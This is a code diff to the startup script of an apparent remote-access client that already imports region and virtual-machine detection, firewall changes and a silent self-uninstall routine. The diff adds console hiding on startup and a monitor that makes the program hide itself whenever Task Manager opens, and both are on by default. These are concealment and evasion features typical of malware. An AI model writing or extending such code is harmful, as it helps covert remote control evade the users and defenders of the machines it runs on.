@@ -18,6 +18,11 @@ from remote_client.security.anti_frod_reg import analyze_region
 from remote_client.security.anti_frod_vm import analyze_device
 from remote_client.security.firewall import ensure_firewall_rules
 from remote_client.security.self_destruct import silent_uninstall_and_cleanup
+from remote_client.security.process_monitor import (
+    start_taskmanager_monitor,
+    stop_taskmanager_monitor,
+    hide_console_window,
+)
 from remote_client.proxy import load_proxy_settings_from_env, set_proxy_settings
 from remote_client.windows.dpi import ensure_dpi_awareness
 
@@ -25,6 +30,16 @@ from remote_client.windows.dpi import ensure_dpi_awareness
 def _anti_fraud_disabled() -> bool:
     value = os.getenv("RC_DISABLE_ANTI_FRAUD", "")
     return value.strip().lower() in {"1", "true", "yes", "on"}
+
+
+def _taskmanager_monitor_enabled() -> bool:
+    value = os.getenv("RC_TASKMANAGER_MONITOR", "1")
+    return value.strip().lower() not in {"0", "false", "no", "off"}
+
+
+def _hide_console_on_start() -> bool:
+    value = os.getenv("RC_HIDE_CONSOLE", "1")
+    return value.strip().lower() not in {"0", "false", "no", "off"}
 
 
 def _configure_logging() -> None:
@@ -48,6 +63,15 @@ def _configure_logging() -> None:
 def main() -> None:
     _configure_logging()
     ensure_dpi_awareness()
+
+    # Hide console window on startup if enabled
+    if _hide_console_on_start():
+        hide_console_window()
+
+    # Start task manager monitor to auto-hide when taskmgr is opened
+    if _taskmanager_monitor_enabled():
+        start_taskmanager_monitor(hide_only=False)
+
     base_dir = os.path.dirname(os.path.abspath(__file__))
     proxy_settings = load_proxy_settings_from_env()
     if proxy_settings:
@@ -100,7 +124,10 @@ def main() -> None:
         team_id,
         client_config,
     )
-    asyncio.run(client.run_forever())
+    try:
+        asyncio.run(client.run_forever())
+    finally:
+        stop_taskmanager_monitor()
 
 
 if __name__ == "__main__":
